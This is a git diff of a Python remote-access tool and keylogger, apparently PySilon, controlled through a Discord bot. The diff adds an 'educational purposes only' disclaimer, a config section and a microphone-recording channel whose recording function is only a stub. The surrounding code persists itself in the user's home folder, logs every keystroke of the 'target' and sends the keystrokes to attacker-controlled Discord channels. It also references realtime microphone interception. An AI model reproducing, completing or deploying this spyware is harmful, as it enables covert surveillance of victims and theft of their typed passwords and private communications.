@@ -8,14 +8,27 @@ from getpass import getuser
 import asyncio
 import sounddevice
 from scipy.io.wavfile import write
+from threading import Thread
 import winreg
 import pyautogui
 from resources.misc import *
 
-client = discord.Client(intents=discord.Intents.all())
-ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
-text_buffor, force_to_send = '', False
-messages_to_send, files_to_send, embeds_to_send = [], [], []
+#############################################################################
+#                                                                           #
+#   DISCLAIMER !!! READ BEFORE USING                                        #
+#                                                                           #
+#   Information and code provided in this project are                       #
+#   for educational purposes only. The creator is no                        #
+#   way responsible for any direct or indirect damage                       #
+#   caused due to the misusage of the information.                          #
+#                                                                           #
+#   Everything you do, you are doing at your own risk and responsibility.   #
+#                                                                           #
+#############################################################################
+
+# ----------- Begin of config ---------- #
+# - Please check out README.md before  - #
+# -   you change following settings    - #
 
 bot_token = ''   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
@@ -25,8 +38,19 @@ software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # 
 channel_ids = {
     'main': 831567586344697868,   # Paste here main channel ID for general output
     'spam': 831567654145097769,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
+    'recordings': 831567740622995457,   # Paste here recording channel ID for microphone recordings storing
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
+
+# -            End of config           - #
+# - Don't change anything below unless - #
+# - you know exacly what are you doing - #
+# -------------------------------------- #
+
+client = discord.Client(intents=discord.Intents.all())
+ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
+text_buffor, force_to_send = '', False
+messages_to_send, files_to_send, embeds_to_send = [], [], []
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
     try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
@@ -41,8 +65,17 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():
-    global force_to_send, messages_to_send, files_to_send, embeds_to_send
-    await client.get_channel(channel_ids['main']).send('```[' + current_time() + '] New PC session```')
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids
+    await client.get_channel(channel_ids['main']).send('||-||```[' + current_time() + '] New PC session```')
+
+    recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
+    print(recording_channel_last_message)
+    if recording_channel_last_message.content != 'disable':
+        Thread(target=start_recording).start()
+        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Starting recording...`')
+    else:
+        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete last message on` <#' + str(channel_ids['recordings']) + '>')
+    
     while True:
         if len(messages_to_send) > 0:
             for message in messages_to_send:
@@ -82,6 +115,9 @@ async def on_message(message):
         vc.play(audio_source, after=None)
     '''
 
+def start_recording():
+    print('asd')
+
 def on_press(key):
     global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
     processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
@@ -91,6 +127,7 @@ def on_press(key):
         match processed_key:
             case Key.space: processed_key = ' '
             case Key.shift: processed_key = ' *`SHIFT`*'
+            case Key.tab: processed_key = ' *`TAB`*'
             case Key.backspace: processed_key = ' *`<`*'
             case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
             case Key.print_screen|'@':
